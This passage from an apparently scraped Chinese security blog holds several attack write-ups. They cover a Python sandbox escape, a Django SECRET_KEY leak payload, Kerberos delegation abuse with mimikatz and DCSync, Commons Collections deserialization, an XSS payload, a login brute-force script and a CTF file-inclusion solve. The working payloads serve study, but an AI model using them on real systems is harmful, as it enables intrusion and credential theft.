i.__init__.__globals__.keys(): print(i, num) except: pass&quot;&quot;&quot;&lt;class '_frozen_importlib._ModuleLock'&gt; 64#省略一堆&quot;&quot;&quot; 于是乎 py3 1().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').system('whoami')&quot;) py2 1().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').system('whoami')&quot;) 继承链读django配置信息 p师傅的利用格式化字符串漏洞泄露Django配置信息一文中给了两个payload都是无登陆情况下读到django配置信息，我们可以用上面所述方法找到更多的payload。 测试代码如下 1234from django.http import HttpResponsedef search(request): template = 'Hello {user}, This is your search: ' + request.GET.get('keyword') return HttpResponse(template.format(user=request.user)) 因为是无登陆情况，所以requests.User里面的对象是AnonymousUser的实例 1234class AnonymousUser(object): #省略 _groups = EmptyManager(Group) _user_permissions = EmptyManager(Permission) 观察到_groups属性是一个EmptyManager对象。 跟踪EmptyManager来到manger.py 123456789##省略from django.db.models.query import QuerySet##省略class EmptyManager(Manager): def __init__(self, model): super(EmptyManager, self).__init__() self.model = model def get_queryset(self): return super(EmptyManager, self).get_queryset().none( 跟踪QuerySet来到query.py 123456789##省略from django.conf import settings##省略class QuerySet(object): &quot;&quot;&quot; Represents a lazy database lookup for a set of objects. &quot;&quot;&quot; def __init__(self, model=None, query=None, using=None, hints=None): settings里面就是django的配置了。 将上面的跟踪一步一步转换成payload就是 拿到EmptyManager对象：user._groups.__class__ 拿到QuerySet对象：user._groups.__class__.__base__.__init__.__globals__[QuerySet] 拿到SECRET_KEY {user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY} 所以最后的payload是 1http://127.0.0.1:8000/search?keyword={user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY} ps:有登陆的情况下构造过程中继承链的感觉更强烈，有兴趣的师傅可以试一下~ 参考 http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ https://www.anquanke.com/post/id/85571 http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html","link":"/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/"},{"title":"用域委派打烂kerberos狗头","text":"简单回顾Kerberos认证过程 假设client想访问server client 向KDC-AS 发起预认证即NTLMhash加密的时间戳 KDC-AS 验证身份后，发送client NTLMhash加密的短会话密钥seesionkey-a和krbtgt账户密码加密的TGT(TGT中也包含了sessionkey-a) client 用自己的NTLMhash解密拿到sessionkey-a，用sessionkey-a加密时间戳并发送加密的TGT给KDC-TGS KDC-TGS用krbtgt账户密码解密获取到sessionkey-a，并解密client发送的时间戳以此验明client身份。之后返回sessionkey-a加密的sessionkey-b和server的密码加密TGS（有的文章也称ST） client用sessionkey-a 解密拿到sessionkey-b，并用sessionkey-b加密时间戳一并和TGS发送给server server用自己的密码解密TGS拿到sessionkey-b解密时间戳以此验明client身份。返回sessionkey-b加密的时间戳给client，以此向client表明自己的身份（这里体现出Kerberos的双向验证）。 委派的场景 n1nty师傅的原话：用户 A 利用 Windows 身份验证访问了一个网站，请求网站内的一个文件，但是这个网站服务器本身并没有这个文件，它需要利用用户 A 的身份去访问另一台服务器，从另一台服务器上获取这个文件后再返回给用户。为什么网站会利用用户 A 的身份去获取文件，而不是直接利用网站自身的权限去获取呢？因为要充分利用 Windows 系统自身提供的权限控制啊，也许有的用户有权限访问那个文件而有的用户没有权限啊。 kerberos委派分类 Forwardable TGT：Unconstrained delegation Proxy ticket：user 在访问 service1 的时候，提前把访问 service2 的票也申请好，并把这张票传递给 service1，然后 service1 就可以利用 user 的身份来访问 service2 Constrained delegation：传统的约束委派 Resource based delegation：基于资源的约束委派 非约束委派（Unconstrained delegation） 假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如dir \\\\server1\\c$）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。示意图如下 其攻击面是如果黑客控制了server1并在上面抓取了tgt就可以借此横向移动。 约束委派 约束委派里面有两种重要的协议一种叫S4U2Proxy，一种叫S4U2Self。假如在给server1主机账户配置了委派到的server2 service2服务。那么当域用户A与server1旗下的service1发生kerberos认证的时候，service1可以拿域用户A给的tgs1从域控换到可以访问server2 service2的tgs2。在用tgs1换tgs2的过程中使用的协议就是S4U2Proxy。可是有可能用户A以其他方式(如NTLM认证，基于表单的认证等方式)与server service1 认证后用户没法提供tgs，那么service1就先需要使用S4U2Self从域控那里先换到用户对自己服务的tgs1，再使用S4U2Proxy换可以访问server2 service2的tgs2。 S4U2Proxy的示意图如下 S4U2Self的示意图如下 其攻击面是如果黑客控制了server1那么他可以伪造域内任意用户访问server2的service2 传统的约束委派 传统的约束委派是“正向的”，通过修改服务A属性msDS-AllowedToDelegateTo，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。 基于资源的约束委派 2012 及以后的KDC，受限委派的机制变成了基于资源的约束委派。基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfOtherIdentity，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。 两者联系与区别示意图如下 发现域内配置委派的账户 在域内的可以委派的账户有两种一种是主机账户（NetComputer）另一种是用setspn手动添加的服务账户（NetUser），上文中不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。 检查非约束委派可以使用master版的PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 12Get-NetUser -Unconstrained -Domain beta.comGet-NetComputer -Unconstrained -Domain beta.com 检查约束委派可以使用开发版的PowerView https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 12Get-DomainUser -TrustedToAuth -Domain beta.comGet-DomainComputer -TrustedToAuth -Domain beta.com 环境说明 WIN-PMID8H9A6H0 192.168.3.2（域控， server2012） exchange 192.168.3.3 (server2012) database 192.168.3.4 (win10) database2 192.168.3.5 (win7) 攻击非约束委派 在WIN-PMID8H9A6H0上用域管登陆（这是一句废话，默认情况只有域管可以登陆域控），在Active Directory用户和计算机中，将computer组里面的database2选为信任此计算机来委派任何服务即非约束委派。然后在cmd中dir \\\\database2\\c$。 在database2上用本地管理员登陆并用mimikatz抓取tickets 1mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit 可以看到域管理员传来的tgt 用mimikatz将域管理员的tgt导入 1mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit 本地管理员成功访问域控 攻击非约束委派（进阶） 上面利用非约束委派拿到域管账户TGT的前提是需要域管账户和委派主机有过交互才能获取到TGT。当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。但是这种攻击有一个限制是需要找到一台开启非受限委派的主机账户，而非服务账户并且有一个域普通账户 完成这一套攻击需要两个Rubeus和SpoolSample的工具，Rubeus可以看作对kekeo的弥补，SpoolSample用户向DC2 Print Spooler发起请求。SpoolSample貌似只能用.net4.0以上的版本编译，所以这次就在win10上用了。 本地管理员运行 1Rubeus.exe monitor /interval:5 /filteruser:WIN-PMID8H9A6H0$ 域普通账户运行 1SpoolSample.exe WIN-PMID8H9A6H0 database2 困惑的是这里报错了，查了报错码说是Print Spooler没开，但是明明开了的。。。 不过峰回路转的是database2 上可以抓到域控传来的tgt 12kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbilsadump::dcsync /domain:beta.com /all /csv 攻击约束委派 域控上这么配置 在database2上用mimikatz抓取主机账户htlm hash（主机账户即hostname$） 12privilege::debugsekurlsa::logonpasswords full 用拿到的ntlm hash申请tgt 1tgt::ask /user:database2$ /domain:beta.com /ntlm:65118c9246cada2aa3e1a366f3ed06cf ps：其实抓hash和kekeo的操作在拥有database2主机权限下都是多余的操作。这里为了完整性写出来，其实际意义在于在实战中通过其他方式例如爆破获取了服务账号的密码（服务账号的密码是管理员自己设置所以可能是弱口令，至于主机账户的密码上上张图你也看到了长的过分）的情况下进行约束委派攻击。 获取访问exchange cifs服务的tgs（tgs是域管权限） 1tgs::s4u /tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi /user:Administrator@beta.com /service:cifs/exchange.beta.com 将tgs导入 1kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi 以本地管理员身份假装域管访问exchange smb 杂 默认情况下普通域用户只能登陆域中的PC不能登陆域中server tgt使用与域账号无关，本地账户仍然可以使用tgt tgt是从本质来说是krbtgt服务的tgs 参考 域渗透-Delegation 利用资源约束委派进行的提权攻击分析 利用 Kerberos delegation 打造变种黄金票据 Setting up delegation between servers for Windows authenticated sites Attacking Kerberos Delegation N1CTF 2019 Pentest N1ctf2019.lab WP Kerberos和NTLM – SQL Server连接的那点事 SQL Server 只安装客户端的方法","link":"/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/"},{"title":"记一次失败的Weblogic IIOP Gadget挖掘","text":"前记 当时以为挖成功了，结果后来发现是少打了一个补丁，在朋友圈虚晃了一枪。不过整个利用思路还算有趣，这并不妨碍在这里分享一下。 sink点可行性验证 开局风干师傅送了个sink点。 我们先来分析一下sink点com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#put的可行性。 如果这里this.m_context是ReplicatedCache$BackingMapContext，反序列化的时候会进入BackingMapContext#getValueFromInternalConverter再进入getConverterFromInternal。 因为this.__m_ConverterFromInternal为transient在反序列的时候为空，根据代码逻辑反序列化的时候会创一个新的converter，并调用convert方法转换受控的oVal的对象。 我们继续跟进，看一下converter是什么样子的, converter类型固定ReplicatedCache$ConverterFromInternal。 ReplicatedCache$ConverterFromInternal的convert。 是不是很眼熟？没错，是我去年挖weblogic的时候找到的sink点, 二阶反序列化类型。 补全gadget 那么现在需要从source点找一条通路，放入常见的source点自动化跑，无奈工具太菜，大海捞针。捞到一个，应该还有其他的，我没一个一个看了。 接下来再用BadAttributeValueExpException前半段就完全走通了。 构造exp与javaassit的妙用 路径找到了接着，就是填充一些必要的条件，构造payload了。 构造的时候会发现对com.tangosol.coherence.component.util.daemon.queueProcessor.Service有依赖。这个类是实现了Serializable接口的，但是官方的本意是不想让它被序列化的， 不过在反序列化的时候，并没有做对应的检查。所以我们用javaassit强行把这个方法改成$1.defaultWriteObject(); 类似的，javaassit的妙用还可以减轻构造payload时候的痛苦，我们可以审计一部分代码，用javaassit把没用的逻辑阉割掉。 例如KeyBackingMap构造方法中 context.getCacheService().getInfo().getServiceName(), 一波连环夺命call要正常运行需要各种补全条件，一波操作就为了拿一个没什么卵用的字符串。 山穷水尽疑无路 至此一切都在向好的方向发展，首先我用没打补丁weblogic走了一波t3，一发入魂，稳稳的。打上最新补丁后走t3没成功，看报错想起了是去年oracle给t3加了一个ABBREV_CLASSES白名单。 但是没有关系，我们还可以用iiop重拳出击。长久以来我一直觉得t3和iiop是等价的东西，exp走t3成功，那走iiop也可成功，因此一直觉得官方单独给t3加白的操作不多余但没必要。 直到打完发现没成功，这下有点傻眼了。 看起来iiop和t3在反序列化的时候还是有不同。根据调用栈和调试可以定位到出错registerMessageType中的getMessageClassMap。 看到这里你可能充满疑惑 反序列化不是可以控制任意成员变量（不严谨）吗？提前给__m_MessageClassMap设置好，不就可以规避空指针的问题？ 为什么t3的时候没有遇到这个问题？ 这里限于篇幅，我就直接说我调试的结论了。 关于第一个问题，确实可以控制，但是这里涉及反序列化时序的问题，就算设置了__m_MessageClassMap，逻辑走到这一步的时候成员变量还没有被赋值。 关于第二个问题，是因为走iiop时，反序列化Component时registerVaildation调用抛出异常了，进入了t3情况下不会进入的validateObject。 而出现异常的原因是也就是depth为0。 通常情况下depth会随着反序列化时的深度动态变化，因此我猜开发的本意是禁止Component成为最外层的对象。 但是IIOP因为自身实现的原因，进入了readObjectOverride，从始至终都没有进入readObject0。也就说整个过程depth一直为0。 至此情况变得很难受。t3白名单打不了，iiop因为这个gadget依赖了特殊的类也打不了。功败垂成，我当时觉得非常可惜。又折腾一会找不到替代类就放弃了。 柳岸花明又一村 大约过了三周之后，我又想起了这个洞，突然eureka。既然正常流能打iiop不能打，那能不能把iiop“转换”成正常流然后再打呢？ 其实通过查看历史漏洞可以知道CVE-2016-3510就可以做到这一点。 至此，全链路已经打通。 为什么失败 交给官方之后被驳回了，后来发现测试的时候少了一个补丁。 打补丁前： 打补丁后： 这里this.setFilter默认为true，也就说从2021的某一次补丁之后fromBinary这个点加了黑名单已经打不了。 后记 虽然根据CVE-2016-3510，iiop和t3在漏洞利用上已经完全等价了。t3白不白已经不重要了，但t3白名单真的无法绕过吗？其实是可以的，但是这里空白太小写不下……","link":"/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/"},{"title":"记一次简单的寻找前端加密爆破的逻辑过程","text":"过程比较简单，属于一篇水文。主要参考这篇文章中的第三种方法。 前端使用vue写的，把前端代码复制出来 找到登陆那点的触发函数 找到提交函数中密码变量 全局搜索即可定位到加密逻辑，并且找到加密用的密钥 通过注释可以发现是AES加密 查看代码变量可以看出是AES-ECB 1234567const encrypt=(word, keyStr)=&gt;{ keyStr = keyStr ? keyStr : 'abcdefgabcdefg12'; let key = CryptoJS.enc.Utf8.parse(keyStr);//Latin1 w8m31+Yy/Nw6thPsMpO5fg== let srcs = CryptoJS.enc.Utf8.parse(word); let encrypted = CryptoJS.AES.encrypt(srcs, key, {mode:CryptoJS.mode.ECB,padding: CryptoJS.pad.Pkcs7}); return encrypted.toString(); }; 从网上找个python版的AES-ECB脚本 12345678910111213141516171819202122232425262728293031from Crypto.Cipher import AESimport osfrom Crypto import Randomimport base64class AESUtil: __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size @staticmethod def encryt(str, key): cipher = AES.new(key, AES.MODE_ECB) x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16) if x != 0: str = str + chr(x)*x msg = cipher.encrypt(str) msg = base64.urlsafe_b64encode(msg).replace('=', '') return msg @staticmethod def decrypt(enStr, key): cipher = AES.new(key, AES.MODE_ECB) enStr += (len(enStr) % 4)*&quot;=&quot; decryptByts = base64.urlsafe_b64decode(enStr) msg = cipher.decrypt(decryptByts) paddingLen = ord(msg[len(msg)-1]) return msg[0:-paddingLen]if __name__ == &quot;__main__&quot;: key = &quot;G20PAA&amp;9-EEFPQ5T&quot; print AESUtil.encryt(&quot;123456&quot;, key) 将跑出来的脚本和提交的对比，发现提交的有padding。 稍微修改一下代码逻辑，从github上下弱口令字典生成加密字典 12345678910111213141516171819202122232425262728293031323334353637import requestsfrom Crypto.Cipher import AESimport osfrom Crypto import Randomimport base64class AESUtil: __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size @staticmethod def encryt(str, key): cipher = AES.new(key, AES.MODE_ECB) x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16) if x != 0: str = str + chr(x)*x msg = cipher.encrypt(str) msg = base64.urlsafe_b64encode(msg) return msg @staticmethod def decrypt(enStr, key): cipher = AES.new(key, AES.MODE_ECB) enStr += (len(enStr) % 4)*&quot;=&quot; decryptByts = base64.urlsafe_b64decode(enStr) msg = cipher.decrypt(decryptByts) paddingLen = ord(msg[len(msg)-1]) return msg[0:-paddingLen]if __name__ == &quot;__main__&quot;: resp = requests.get(url=&quot;https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/master/passwordDict/top1000.txt&quot;) passwd_list = resp.content.split('\\n') key = &quot;G20PAA&amp;9-EEFPQ5T&quot; with open('./top1000en.txt', 'a+') as f: for i in passwd_list: f.write(AESUtil.encryt(i, key) + '\\n') print AESUtil.encryt(&quot;123456&quot;, key)","link":"/2019/11/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BB%E6%89%BE%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%87%E7%A8%8B/"},{"title":"记一次调试Commons Collections5遇到的小坑","text":"故事的起因是学弟来问我为什么在调Commons Collections5的时候，还没有走到触发点就触发了RCE。并发来了这篇文章。 我当时以commons collections5为例，调试了一下代码发现确实有这种情况。以下是调试用的demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Poc { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), //反射调用exec方法 new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;open /Applications/Calculator.app/&quot;}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //decorate实例化LazyMap类。 // LazyMap類的get方法調用了transform,transform可以通過反射机制执行命令 TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;); //TiedMapEntry中调用了toString方法-&gt;调用了map的get方法 BadAttributeValueExpException poc = new BadAttributeValueExpException(null); //BadAttributeValueExpException的构造方法调用toString方法// val是私有变量，所以利用下面方法进行赋值,val变量赋值为TiedMapEntry的实例化对象,// 重写了BadAttributeValueExpException的readObject方法的val变量赋值为BadAttributeValueExpException类，// 就会调用BadAttributeValueExpException的val = valObj.toString();触发上面的 Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);// System.out.println(valfield); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(&quot;poc.txt&quot;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;poc.txt&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); }} 实际调试的时候我发现确实有学弟所说的情况，一图胜千言。 反复调了几次都是这个情况，感觉网上文章分析并没有问题因为走到toString那个点也会触发rce，调试时候的那个点也没道理弹框，感觉是idea有bug。后来去群里请教了一下师傅，evil7大师傅给了答案。师傅意思大致就是说在调试的时候调试器打印了valObj，所以相当于提前触发了valObj的toString方法。换句话说在调试情况下RCE触发了两次。","link":"/2019/11/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B0%83%E8%AF%95Commons%20Collections5%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E5%9D%91/"},{"title":"记录xss挑战赛14题解题过程","text":"解题过程 只思考了这道题，然后就陷进去了。先来看题。 12345678910111213&lt;?phpheader('X-XSS-Protection:0');header('Content-Type:text/html;charset=utf-8');?&gt;&lt;head&gt;&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=''&gt;&lt;input type='hidden' name='token' value='&lt;?php echo htmlspecialchars($_GET['token']); ?&gt;'&gt;&lt;input type='submit'&gt;&lt;/body&gt; 考点是输出点出现在input hidden框里面，因为文本框被隐藏一般的和点击有关的事件（如 onfocus）就不会被触发了。 传统的解法大概有三种 第一种：IE6下用css的expression属性触发 第二种：firefox用accesskey=”X” onclick=alert(),然后shift+alt+x 触发 第三种：如果输入点在type=hidden前可以用另外一个type如type=text将type=hidden覆盖掉（这道题不行） 显然传统的办法肯定不会通过的（规则是：需要最新浏览器，不需要交互） 然后我就开始了漫漫的踩坑路。因为源码中有&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;所以我认为xss是在IE下触发.然后打开input=hidden的官方手册惊喜的发现input hidden下还有on*事件 然后百度了一下用法 onbeforedeactivate Fires immediately before the activeElement is changed from the current object to another object in the parent document. 在 activeElement 从当前对象变为父文档其它对象之前立即触发。不懂~ ondatasetcomplete Fires to indicate that all data is available from the data source object. 数据在数据源发生变化时触发的事件，不懂~ oninvalid Provides specified alert text if an input element is invalid. 123&lt;input type=&quot;text&quot; oninvalid=&quot;alert('该项不能空!');&quot; name=&quot;fname&quot; required&gt;&lt;input type=&quot;text&quot; name=&quot;phone&quot; maxlength=&quot;11&quot; pattern=&quot;^(0|86|17951)?1[0-9]{10}&quot; oninvalid=&quot;setCustomValidity('请输入11位手机号');&quot;/&gt; onselect onselect 事件会在文本框中的文本被选中时发生。 Fires when the current selection changes. onpropertychange 动态监听输入框值变化的情况，比如value属性的值改变时会触发 前两个不是很懂什么意思，试了后三个都不行 oninvalid：oninvalid一般情况下必须要配合required或者pattern,可惜的是hidden下均不支持 onselect：显然框都隐藏了，不可能还需要文本，况且需要交互。 onpropertychange：是一个死逻辑，想改变value值就许必须有个js触发点然后用DOM，不过既然都有触法点了谁还会用这个属性（这道题而言） 然后我就蒙蔽了，既然通常情况下都不行，那为什么还会写在input type=hidden下面，黑人问号？？？ 最后看到了柠檬师傅的正确答案 token=' style=behavior:url(x) onreadystatechange=alert(1) ' 后来查资料发现这是一个IE6~IE10支持的一个css的语法，behavior:url(???)允许调用一个外部的.htc文件来修改HTML的行为和方法（但是受同源策略影响）具体语法可以看 如果成功就有上传htc文件（可以写更复杂的利用代码而没有长度限制）配合xss这个思路。因为 .htc files are commonly used in .css files using an IE specific property called behavior, using this along with the .htc file allows the browser to run JavaScript code which is whats contained within the file. 下面是是一个利用demo 12345678910&lt;html&gt; &lt;head&gt; &lt;style&gt; h1 { behavior: url(behave.htc) } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;把鼠标放在这里 poluoluo.com&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 123456789101112131415&lt;component&gt;&lt;attach for=&quot;element&quot; event=&quot;onmouseover&quot; handler=&quot;hig_lite&quot; /&gt;&lt;attach for=&quot;element&quot; event=&quot;onmouseout&quot; handler=&quot;low_lite&quot; /&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(1);function hig_lite(){ element.style.color=255}function low_lite(){ element.style.color=0}&lt;/script&gt;&lt;/component&gt; 最后 如有出错,还请指教 开学快乐！！","link":"/2017/09/01/%E8%AE%B0%E5%BD%95xss%E6%8C%91%E6%88%98%E8%B5%9B14%E9%A2%98%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/"},{"title":"记录一道题的多种解法","text":"通过备份文件泄露拿到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phperror_reporting(0);ini_set('open_basedir', '/var/www/html');function autoload($page) { if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) { die('no flag flag flag flag !'); } if (stripos($_SERVER['QUERY_STRING'], 'uploaded') &gt; 0) { die('no uploaded uploaded uploaded uploaded !'); } if (stripos($_SERVER['QUERY_STRING'], '://f') &gt; 0) { die('no ://f ://f ://f'); } if (stripos($_SERVER['QUERY_STRING'], 'ata') &gt; 0) { die('no ata ata ata'); } if (stripos($_SERVER['QUERY_STRING'], '0') &gt; 0) { die('no 0 0 0'); } if(file_exists(&quot;./includes/$page.php&quot;)) { include &quot;./includes/$page.php&quot;; } elseif(file_exists(&quot;./includes/$page&quot;)) { include &quot;./includes/$page&quot;; }else{ echo &quot;File is not exit &quot;; }}function download($adfile, $file){ //Only Administrators can download files . $cert = 'N'; if(isset($adfile) &amp;&amp; file_get_contents($adfile, 'r') === 'Yeah Everything Will Be Ok My Boss') { echo &quot;Welcome ! You Are Administrator !&quot;; $cert = 'Y'; }else{ echo &quot;error1&quot;; } if ($cert === 'Y'){ if (stripos($file, 'file_list') != false) die('error4'); if (stripos($file, 'file_list') &gt;= 0) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename='. basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); }else{ die('error2'); }}else{ echo 'error3';}}if(!isset($_GET['page'])) { $page = 'index';}else { $page = $_GET['page'];}//不允许跳目录if (stripos($page, './') &gt; 0) { die('no ./ ./ ./ ./');}//不允许用协议if (stripos($page, '://') &gt; 0) { die('no :// :// ://');}autoload($page);if (isset($_GET[admin]) &amp;&amp; isset($_GET[file])) { if (stripos($_GET[admin], 'flag') &gt; 0 || stripos($_GET[file], 'flag') &gt; 0) { die('not flag flag flag falg !'); } if (strlen($_GET[file]) &gt;= 38) { die('too long'); } download($_GET[admin], $_GET[file]);}?&gt; 这个题还有一个上传点，要拿到upload.php。读文件的点在 这里可以用远程服务器写 echo -n “Yeah Everything Will Be Ok My Boss” &gt;&gt; index.html，然后访问读取 也可以php://input+Yeah Everything Will Be Ok My Boss 下面拿到download.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 &lt;?php if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) { die('no flag flag flag flag !'); } if (!empty($_FILES)) { //properties of the uploaded file $name= $_FILES[&quot;filename&quot;][&quot;name&quot;]; $type= $_FILES[&quot;filename&quot;][&quot;type&quot;]; $size= $_FILES[&quot;filename&quot;][&quot;size&quot;]; $temp= $_FILES[&quot;filename&quot;][&quot;tmp_name&quot;]; $error= $_FILES[&quot;filename&quot;][&quot;error&quot;]; if (strlen($name) &gt;= 6) { die('name is too long !'); } if (stripos($name, './') &gt; 0) { die('invalid parameter'); } if (stripos($name, 'php') &gt; 0) { die('invalid parameter'); } //只能上传zip if (substr($name, -3, 3) !== 'zip' &amp;&amp; substr($name, -3, 3) !== 'jpg' &amp;&amp; substr($name, -3, 3) !== 'png') { die('file can not upload ! '); } if ($error &gt; 0) die(&quot;Error uploading file! code $error.&quot;); else { if($type !== &quot;application/zip&quot; || $size &gt; 400)//condition for the file { die(&quot;Format not allowed or file size too big!&quot;); } else { if(file_exists('includes')){ move_uploaded_file($temp, &quot;includes/uploaded/&quot; .$name); echo &quot;Upload complete a!&quot;; shell_exec('sh /var/www/html/includes/ '); }elseif(file_exists('uploaded')){ move_uploaded_file($temp, &quot;uploaded/&quot; .$name); echo &quot;Upload complete!&quot;; shell_exec('sh /var/www/html/includes/unzip.sh'); } } } }else{ if(isset($_GET['step']) &amp;&amp; strlen($_GET['step']) === 20) { if (stripos($_GET['step'], 'lag') &gt; 0) { die('error'); } if (stripos($_GET['step'], './') &gt; 0) { die('error'); } if (stripos($_GET['step'], ' ') &gt; 0) { die('error'); } if (stripos($_GET['step'], '/') &gt; 0) { die('error'); } if (preg_match('/[^\\w\\d_ -]/si', $_GET['step'])) { $_GET['step'] = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $_GET['step']); die('error'); } passthru('cat ' . 'uploaded/' . $_GET['step']); }else{ die(); } } ?&gt; &lt;/body&gt;&lt;/html&gt; 这段代码的大意是只能上传长度有限的代码，然后会进入 12345}elseif(file_exists('uploaded')){ move_uploaded_file($temp, &quot;uploaded/&quot; .$name); echo &quot;Upload complete!&quot;; shell_exec('sh /var/www/html/includes/unzip.sh');} 用同样的手法读出unzip.sh 可以看到它是先解压压缩包然后一点一点的删掉。 所以第一种方式就是利用时间差条件竞争，这也是我队师傅用的方法。这里省略。 然后第二天看别人wp的时候。发现一个比较巧妙的方法，就是观察到sh并没有删除所有的文件，保留了没有后缀名的文件（rm -rf ./uploaded/.*并不是删除当前文件所有内容的命令）。所以可以上传一个没有后缀名的php然后用index.php的包含代码包含进来。 在zip中压缩一个clound文件如下所示（这里需要注意因为是include进来，所以cat后面的路径是flag和index.php的路径） 123&lt;?php system('cat flag/flag/flag/flag/flag/flag/flag.php');?&gt; 然后访问http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/clound 这个payload的构造很有意思巧妙的绕过了。 注意到flag是flag{CVE_SomeThing_aBout_gitLab}也就就说上述两种方法都应该是非预期。 在网搜一下gitlab的历史漏洞注意到一个很有意思的漏洞通过软连接来读文件，隐隐感觉如果用这个姿势来做是一个很优雅的解法。 首先经过一次失败的实验发现软连接是相对的路径的。也就说建立软连接的时候要把flag的位置和软连接的位置摆好。假设/var/www/html为根目录 flag的位置/var/www/html/flag/flag/flag/flag/flag/flag/flag.php 上传的位置 /flag/flag/flag/flag/flag/flag/flag.php 